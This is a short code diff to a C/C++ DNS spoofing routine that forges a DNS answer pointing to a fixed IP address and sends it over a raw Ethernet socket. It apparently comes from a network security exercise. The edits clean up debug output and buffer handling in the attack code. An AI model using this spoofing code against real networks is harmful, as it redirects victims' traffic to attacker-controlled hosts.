@@ -419,13 +419,6 @@ void send_spoofed_dns_reply(char *packet)
     answer->rdlength = htons(4);
     answer->rdata = inet_addr("140.113.24.241");
     // set rdata 140.113.24.241
-    // cout to parse answer section: name type class ttl rdlength rdata
-    cout << "Name: " << ntohs(answer->name) << endl;
-    cout << "Type: " << ntohs(answer->type) << endl;
-    cout << "Class: " << ntohs(answer->class_) << endl;
-    cout << "TTL: " << ntohl(answer->ttl) << endl;
-    cout << "RDLength: " << ntohs(answer->rdlength) << endl;
-    cout << "RData: " << inet_ntoa(*(in_addr *)&answer->rdata) << endl;
 
 
     // calculate total length  
@@ -506,6 +499,7 @@ void send_spoofed_dns_reply(char *packet)
     eth_header->ether_type = htons(ETH_P_IP);
     // attach the packet with eth header
     char *spoofed_packet = (char *)malloc(total_len + ETHER_HEADER_LEN);
+    memset(spoofed_packet, 0, total_len + ETHER_HEADER_LEN);
     memcpy(spoofed_packet, eth_header, ETHER_HEADER_LEN);
     memcpy(spoofed_packet + ETHER_HEADER_LEN, packet, total_len);    
 
@@ -524,9 +518,6 @@ void send_spoofed_dns_reply(char *packet)
     socket_address.sll_family = AF_PACKET;
     socket_address.sll_pkttype = PACKET_BROADCAST;
     socket_address.sll_hatype = htons(ARPHRD_ETHER);
-    socket_address.sll_addr[6] = 0x00;
-    socket_address.sll_addr[7] = 0x00;
-
     memcpy(socket_address.sll_addr, source_mac_char, 6);
 
     if(sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1)
